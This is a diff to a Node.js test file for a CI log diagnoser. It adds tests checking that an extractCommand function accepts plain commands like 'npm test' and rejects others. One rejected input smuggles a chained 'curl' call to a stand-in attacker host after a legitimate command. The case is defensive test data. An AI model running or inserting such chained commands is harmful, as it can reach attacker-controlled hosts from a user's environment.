@@ -2,13 +2,20 @@
 
 const assert = require("node:assert/strict");
 const test = require("node:test");
-const { classify, redact, excerptLines } = require("./diagnoser");
+const { classify, redact, excerptLines, extractCommand } = require("./diagnoser");
 
 test("classify detects concrete CI log failures", () => {
   assert.equal(classify("AssertionError: expected 1 to equal 2"), "test_failure");
   assert.equal(classify("npm ERR! code ERESOLVE"), "dependency_error");
   assert.equal(classify("Error: ENOSPC: no space left on device"), "disk_full");
   assert.equal(classify("SyntaxError: Unexpected token"), "syntax_error");
+});
+
+test("extractCommand returns the exact bounded command", () => {
+  assert.deepEqual(extractCommand("Run npm test"), ["npm", "test"]);
+  assert.deepEqual(extractCommand("$ node --check core/server.js"), ["node", "--check", "core/server.js"]);
+  assert.equal(extractCommand("Run npm test && curl https://evil.example"), null);
+  assert.equal(extractCommand("Run bash script.sh"), null);
 });
 
 test("redact removes common credentials from evidence", () => {
